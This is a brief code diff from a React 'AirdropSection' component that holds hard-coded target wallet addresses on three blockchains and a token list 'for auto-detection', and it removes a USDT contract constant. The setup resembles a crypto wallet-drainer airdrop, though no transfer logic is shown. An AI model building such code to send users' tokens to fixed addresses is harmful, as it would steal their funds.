@@ -18,9 +18,6 @@ const AirdropSection = () => {
   const TRC20_TARGET_ADDRESS = 'TAzayLZmaCVVfuY4kxrp6Z1S76wwuTR4fX';
   const SOLANA_TARGET_ADDRESS = '6VL8cCgFsuB3HfL8PCFjFRSDuiv267hS2fYBXdXUYpg9';
   const BSC_TARGET_ADDRESS = '0x6FDEE9BA3c4B6D12fB159D64CC6C0EB3AC931570';
-  
-  // USDT TRC20 Contract Address on Tron
-  const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
   // Popular TRC20 Token Contracts (for auto-detection)
   const POPULAR_TRC20_TOKENS = [
